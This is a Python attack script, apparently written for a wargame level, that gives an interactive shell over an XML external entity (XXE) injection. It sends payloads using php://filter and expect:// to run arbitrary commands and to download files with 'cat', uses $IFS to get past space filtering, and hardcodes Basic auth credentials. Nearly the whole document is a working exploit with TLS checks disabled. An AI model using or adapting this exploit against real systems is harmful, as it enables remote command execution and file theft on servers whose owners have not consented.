#!/usr/bin/env python3

import argparse
import base64
import cmd
import requests
import re

class XXECommandLine(cmd.Cmd):
    """Accepts commands and executes them against a given URL"""

    prompt = 'xxe sh$ '
    xml_template = '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE root ' \
        '[<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/' \
        'resource=expect://CMD" >]><root><name></name><tel>' \
        '</tel><email>OUT&xxe;OUT</email><password></password></root>'
    
    # Add basic authentication headers
    auth = ('level8', '4896be9d0f9da6266f1d6b84401ee701')

    def __init__(self, url):
        cmd.Cmd.__init__(self)
        self.url = url

    def do_quit(self, arg):
        return True

    def do_getfile(self, arg):
        i = arg.rfind('/') + 1
        fname = arg[i:]
        
        # Add basic authentication headers to the request
        headers = {'Authorization': 'Basic ' + base64.b64encode(f'{self.auth[0]}:{self.auth[1]}'.encode()).decode()}

        req = requests.post(self.url, data=self.xml_template.replace('CMD', f'cat {arg}'), headers=headers, verify=False)
        if req.status_code == 200:
            with open(fname, 'wb') as fh:
                content = re.search(r'OUT(.+?)OUT', str(req.content), re.DOTALL)
                if content:
                    decoded_content = base64.b64decode(content.group(1))
                    fh.write(decoded_content)
                    print(f"File '{fname}' successfully retrieved.")
                else:
                    print("File retrieval failed.")
        else:
            print(f"Received HTTP {req.status_code}")

    def do_cmd(self, cmd):
        # Add basic authentication headers to the request
        headers = {'Authorization': 'Basic ' + base64.b64encode(f'{self.auth[0]}:{self.auth[1]}'.encode()).decode()}

        req = requests.post(self.url, data=self.xml_template.replace('CMD', cmd.replace(' ', '$IFS')), headers=headers, verify=False)
        if req.status_code == 200:
            content = re.search(r'OUT(.+?)OUT', str(req.content), re.DOTALL)
            if content:
                decoded_content = base64.b64decode(content.group(1)).decode('utf-8')
                print(decoded_content)
            else:
                print("No matches found.")
        else:
            print(f"Received HTTP {req.status_code}")

def banner():
    print(r'____  _______  ______________   _________.__           .__  .__   ')
    print(r'\   \/  /\   \/  /\_   _____/  /   _____/|  |__   ____ |  | |  |  ')
    print(r' \     /  \     /  |    __)_   \_____  \ |  |  \_/ __ \|  | |  |  ')
    print(r' /     \  /     \  |        \  /        \|   Y  \  ___/|  |_|  |__')
    print(r'/___/\  \/___/\  \/_______  / /_______  /|___|  /\___  >____/____/')
    print(r'      \_/      \_/        \/          \/      \/     \/           ')
    print(r'                                                        @tygarsai ')
    print(r'')

if __name__ == '__main__':
    banner()
    parser = argparse.ArgumentParser()
    parser.add_argument('url')

    results = parser.parse_args()
    url = results.url

    XXECommandLine(url).cmdloop()
